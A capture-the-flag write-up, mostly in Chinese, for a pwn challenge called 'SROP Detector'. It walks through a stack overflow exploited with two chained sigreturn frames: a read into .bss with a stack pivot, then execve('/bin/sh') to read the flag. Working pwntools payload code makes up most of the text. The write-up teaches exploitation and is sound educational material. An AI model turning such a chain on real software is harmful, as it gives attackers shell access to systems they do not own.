# SROP Detector

## 題目描述

My friend Cebolinha send me this file called SROP detector. He always mispronounce "l" as "r" so I think this probably detects AI stuff

## 解題思路

1. **第一步**：

   這題的攻擊手法是Sigreturn Oriented Programming，簡稱 SROP。

   程式在讀取輸入時存在stack overflow，因此可以先填滿buffer和saved RBP，接著控制return address：

   ```python
   payload = b"A" * 72
   ```

   這題可以使用syscall@plt來呼叫libc的syscall() wrapper。因為後面會用syscall(15)觸發rt_sigreturn，所以可以先呼叫一次syscall(39)，讓 syscall@plt先完成lazy binding，讓後面的SROP比較穩定。

   ```python
   payload += p64(pop_rdi)
   payload += p64(39)
   payload += p64(syscall_plt)
   ```

2. **第二步**：

   呼叫syscall(15)觸發第一次 SROP。

   ```python
   payload += p64(pop_rdi)
   payload += p64(15)
   payload += p64(syscall_plt)
   payload += bytes(frame1)
   ```

   frame1被設定成執行：

   ```c
   syscall(0, 0, bss, 0x500)    // read(0, bss, 0x500)
   ```

   因為原本stack上塞不下完整的第二階段payload，所以第一次SROP的目的，是先把第二階段payload讀到`.bss`，並且把rsp也切到`.bss`上。

   ```python
   frame1 = SigreturnFrame()

   frame1.rip = syscall_plt
   frame1.rdi = 0          # syscall number = read
   frame1.rsi = 0          # fd = stdin
   frame1.rdx = bss        # buf = bss
   frame1.rcx = 0x500      # count = 0x500
   frame1.rsp = bss        # stack pivot to .bss
   ```

3. **第三步**：

   第二階段payload被讀到`.bss`後，會再觸發一次rt_sigreturn。

   ```python
   stage2 = b""

   stage2 += p64(pop_rdi)
   stage2 += p64(15)
   stage2 += p64(syscall_plt)
   stage2 += bytes(frame2)
   ```

   frame2目標是執行：

   ```c
   syscall(59, "/bin/sh", argv, NULL)     // execve("/bin/sh", ["/bin/sh", NULL], NULL)
   ```

   ```python
   binsh_addr = bss + 0x300
   argv_addr = bss + 0x320

   frame2 = SigreturnFrame()
   frame2.rip = syscall_plt
   frame2.rdi = 59             # syscall number = execve
   frame2.rsi = binsh_addr     # filename = "/bin/sh"
   frame2.rdx = argv_addr      # argv
   frame2.rcx = 0              # envp = NULL
   frame2.rsp = bss + 0x500
   ```

   接著在`.bss`裡放好`/bin/sh`字串和argv：

   ```python
   stage2 = stage2.ljust(0x300, b"\x00")
   stage2 += b"/bin/sh\x00"

   stage2 = stage2.ljust(0x320, b"\x00")
   stage2 += p64(binsh_addr)
   stage2 += p64(0)
   ```

   這樣第二次SROP後就會執行`/bin/sh`，拿到shell後再輸入：

   ```bash
   cat /flag.txt
   ```

   就可以拿到flag。

## Flag

```text
dalctf{1_r34lly_h0p3_u_d1dnt_sl0p_1t}
```
